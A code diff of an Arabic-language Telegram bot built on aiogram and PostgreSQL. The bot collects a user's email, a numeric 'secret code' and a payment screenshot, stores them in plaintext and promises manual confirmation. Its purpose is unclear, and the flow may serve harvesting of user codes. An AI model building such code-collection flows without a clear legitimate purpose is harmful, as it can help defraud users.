@@ -1,53 +1,53 @@
 import logging
-from aiogram import Bot, Dispatcher, types
-from aiogram.types import FSInputFile
-from aiogram.enums import ParseMode
-from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import StatesGroup, State
+from aiogram import Bot, Dispatcher, types, executor
 import os
+import psycopg2
+from dotenv import load_dotenv
 
-TOKEN = os.getenv("BOT_TOKEN")
-bot = Bot(token=TOKEN, parse_mode=ParseMode.HTML)
-dp = Dispatcher(storage=MemoryStorage())
+load_dotenv()
 
-class Form(StatesGroup):
-    email = State()
-    code = State()
-    screenshot = State()
+API_TOKEN = os.getenv("BOT_TOKEN")
 
-@dp.message()
-async def start_handler(message: types.Message, state: FSMContext):
-    await message.answer("✅ أرسل بريدك الإلكتروني:")
-    await state.set_state(Form.email)
+# إعدادات البوت
+logging.basicConfig(level=logging.INFO)
+bot = Bot(token=API_TOKEN)
+dp = Dispatcher(bot)
 
-@dp.message(Form.email)
-async def email_handler(message: types.Message, state: FSMContext):
-    await state.update_data(email=message.text)
-    await message.answer("🔐 أرسل الرمز السري:")
-    await state.set_state(Form.code)
+# الاتصال بقاعدة البيانات
+conn = psycopg2.connect(os.getenv("DATABASE_URL"), sslmode="require")
+cur = conn.cursor()
 
-@dp.message(Form.code)
-async def code_handler(message: types.Message, state: FSMContext):
-    await state.update_data(code=message.text)
-    await message.answer("📸 أرسل لقطة الشاشة بعد الدفع:")
-    await state.set_state(Form.screenshot)
+# أوامر البوت
+@dp.message_handler(commands=['start'])
+async def send_welcome(message: types.Message):
+    await message.answer("👋 مرحبا بك! من فضلك أرسل بريدك الإلكتروني:")
 
-@dp.message(Form.screenshot)
-async def screenshot_handler(message: types.Message, state: FSMContext):
-    if message.photo:
-        file_id = message.photo[-1].file_id
-        data = await state.get_data()
-        await message.answer("✅ تم استلام الدفعة بنجاح!\n📩 سيتم تأكيد حسابك قريبًا.")
-        print(f"Email: {data['email']}, Code: {data['code']}, Screenshot: {file_id}")
-    else:
-        await message.answer("❌ أرسل صورة فقط من فضلك.")
-    await state.clear()
+# استقبال البريد الإلكتروني
+@dp.message_handler(lambda message: "@" in message.text)
+async def get_email(message: types.Message):
+    user_id = message.from_user.id
+    email = message.text
+    cur.execute("INSERT INTO users (user_id, email) VALUES (%s, %s) ON CONFLICT (user_id) DO UPDATE SET email = EXCLUDED.email", (user_id, email))
+    conn.commit()
+    await message.answer("✅ تم تسجيل بريدك الإلكتروني. الآن أرسل الكود السري.")
 
-async def main():
-    logging.basicConfig(level=logging.INFO)
-    await dp.start_polling(bot)
+# استقبال الكود
+@dp.message_handler(lambda message: message.text.isdigit())
+async def get_code(message: types.Message):
+    user_id = message.from_user.id
+    code = message.text
+    cur.execute("UPDATE users SET code = %s WHERE user_id = %s", (code, user_id))
+    conn.commit()
+    await message.answer("💸 أرسل الآن إثبات الدفع (لقطة شاشة).")
 
-if __name__ == "__main__":
-    import asyncio
-    asyncio.run(main())
+# استقبال لقطة الشاشة
+@dp.message_handler(content_types=types.ContentType.PHOTO)
+async def get_payment_proof(message: types.Message):
+    user_id = message.from_user.id
+    file_id = message.photo[-1].file_id
+    cur.execute("UPDATE users SET payment_proof = %s WHERE user_id = %s", (file_id, user_id))
+    conn.commit()
+    await message.answer("📥 تم حفظ إثبات الدفع بنجاح.\nنحن في انتظار التأكيد اليدوي.")
+
+if __name__ == '__main__':
+    executor.start_polling(dp, skip_updates=True)
